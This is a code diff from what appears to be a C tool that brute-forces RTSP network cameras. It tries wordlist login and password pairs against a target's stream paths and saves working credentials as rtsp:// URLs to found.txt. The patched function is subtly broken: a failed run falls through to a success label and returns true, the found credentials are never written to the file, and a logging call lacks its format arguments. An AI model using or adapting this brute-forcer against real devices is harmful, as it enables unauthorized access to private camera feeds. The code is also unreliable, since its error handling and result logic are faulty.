@@ -108,27 +108,6 @@ void sslog /* No streSS */(bool verbose_only, const char* color, const char* lab
   pthread_mutex_unlock (&log_mutex);
 }
 
-static size_t WrMemCallback(void *contents, size_t size, size_t nmemb, void *userp)
-{
-    if (!contents || !userp) return 0;
-    struct MemBuf *mem = userp;
-    if (nmemb != 0 && size > SIZE_MAX / nmemb) return 0;
-
-    size_t realsize = size * nmemb;
-
-    if (mem->size > SIZE_MAX - realsize - 1) return 0;
-    char *ptr = MemoryReAllocate (mem->memory, mem->size + realsize + 1);
-    if (!ptr) return 0;
-
-    mem->memory = ptr;
-
-    memcpy(mem->memory + mem->size, contents, realsize);
-    mem->size += realsize;
-    mem->memory[mem->size] = '\0';
-
-    return realsize;
-}
-
 void bsfEncode (const char* input, char* output)
 {
   const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -208,47 +187,39 @@ bool bruteforce (radarType* target)
 {
   pthread_t anim_tid;
   atomic_store (&globA.active, true);
-  FILE *fLog = fopen ("brute/logins.txt", "r");
-  FILE *fPass = fopen ("brute/passwords.txt", "r");
-  pthread_create (&anim_tid, NULL, scanim, &globA);
 
+  FILE *fLog = fopen ("brute/logins.txt", "r");
   if (!fLog) {
     sslog (false, COL_RED, "ERROR", "Cannot open brute/logins.txt");
-    atomic_store(&globA.active, false);
-    pthread_join(anim_tid, NULL);
-    fclose (fLog);
-    return false;
-  } else if (!fPass) {
-    sslog (false, COL_RED, "ERROR", "Cannot open brute/passwords.txt");
-    atomic_store(&globA.active, false);
-    pthread_join(anim_tid, NULL);
-    fclose (fPass);
     return false;
   }
 
+  FILE *fPass = fopen ("brute/passwords.txt", "r");
+  if (!fPass) {
+    sslog (false, COL_RED, "ERROR", "Cannot open brute/passwords.txt");
+    fclose (fLog);
+    return false;
+  }
+
+  pthread_create (&anim_tid, NULL, scanim, &globA);
+
   fseek (fLog, 0, SEEK_END);
   long log_s = ftell(fLog);
-  fseek (fLog, 0, SEEK_SET);
+  rewind (fLog);
 
   fseek (fPass, 0, SEEK_END);
   long pass_s = ftell(fPass);
-  fseek (fPass, 0, SEEK_SET);
+  rewind (fPass);
 
   if (log_s == 0) {
     sslog (false, COL_RED, "ERROR", "brute/logins.txt is empty!");
-    goto brute_cleanup;
+    goto brute_fail;
   }
 
   if (pass_s == 0) {
     sslog (false, COL_RED, "ERROR", "brute/passwords.txt is empty!");
-    goto brute_cleanup;
+    goto brute_fail;
   }
-
-  brute_cleanup:
-    if (fLog) fclose (fLog);
-    if (fPass) fclose (fPass);
-    atomic_store (&globA.active, false);
-    return false;
 
   sslog (true, COL_CYAN, "INFO", "Loaded %ld bytes from logins.txt, %ld bytes from passwords.");
 
@@ -302,15 +273,8 @@ bool bruteforce (radarType* target)
         if (received > 0 && strstr (resp, "RTSP/1.0 200")) {
           sslog (false, COL_GRN, "SUCCESS", "%s:%d%s -> %s:%s\n", ip, target->port, rtspPath[p], login, pass);
           FILE *res = fopen ("found.txt", "a");
-          if (res) {
-            fprintf (res, "rtsp://%s:%s@%s:%d%s\n", login, pass, ip, target->port, rtspPath[p]);
-            fclose (res);
-          }
-          fclose (fLog);
-          fclose (fPass);
-          atomic_store (&globA.active, false);
-          pthread_join (anim_tid, NULL);
-          return true;
+          goto brute_success;
+          fclose (res);
         }
         snprintf (globA.msg, 256, COL_BLU "\r[INFO] Brute Attemp #%d | %s:%s on %s, please wait." COL_DEF, attemp, login, pass, rtspPath[p]);
         fflush (stdout);
@@ -321,11 +285,19 @@ bool bruteforce (radarType* target)
   }
   sslog (false, COL_YLW, "INFO", "Bruteforce completed: %d attempts, no valid credentials found", attemp);
 
-  atomic_store (&globA.active, false);
-  pthread_join (anim_tid, NULL);
-  fclose(fLog);
-  fclose(fPass);
-  return false;
+  brute_success:
+    atomic_store (&globA.active, false);
+    pthread_join (anim_tid, NULL);
+    fclose (fLog);
+    fclose (fPass);
+    return true;
+
+  brute_fail:
+    atomic_store (&globA.active, false);
+    pthread_join (anim_tid, NULL);
+    if (fLog) fclose (fLog);
+    if (fPass) fclose (fPass);
+    return false;
 }
 
 bool check4Cam (int         sockfd,
